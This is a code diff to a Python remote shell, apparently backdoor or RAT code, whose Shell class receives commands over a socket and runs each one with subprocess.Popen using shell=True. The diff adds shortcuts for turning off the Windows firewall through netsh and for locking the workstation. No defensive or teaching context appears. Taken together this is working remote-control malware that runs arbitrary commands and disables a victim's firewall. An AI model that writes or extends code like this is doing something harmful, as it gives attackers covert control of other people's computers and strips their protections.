@@ -2,6 +2,7 @@ from encodings import utf_8
 import os
 import socket
 import subprocess
+import ctypes
 
 
 class Shell:
@@ -32,15 +33,29 @@ class Shell:
                 data = data.strip('\n')
 
                 # Special cases
-                if data == "quit" or data == "exit":  # Exits shell
+                
+                # Exits shell
+                if data == "quit" or data == "exit":  
                     break
-
-                if data[:2] == "cd":  # Changes directory
+                
+                # Changes directory
+                if data[:2] == "cd":  
                     os.chdir(data[3:])
 
-                if data == "ls":  # Lists cwd with ls
+                # Lists cwd with ls
+                if data == "ls":  
                     data = "dir"
-
+                
+                # Disables/enables firewall
+                if data == "firewall off":
+                    data = "netsh advfirewall set currentprofile state off"
+                if data == "firewall on":
+                    data = "netsh advfirewall set currentprofile state on"
+                    
+                if data == "lock":
+                    ctypes.windll.user32.LockWorkStation()
+                    data = "echo Screen locked"
+                
                 if len(data) > 0:
                     # Executes arbitrary command
                     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
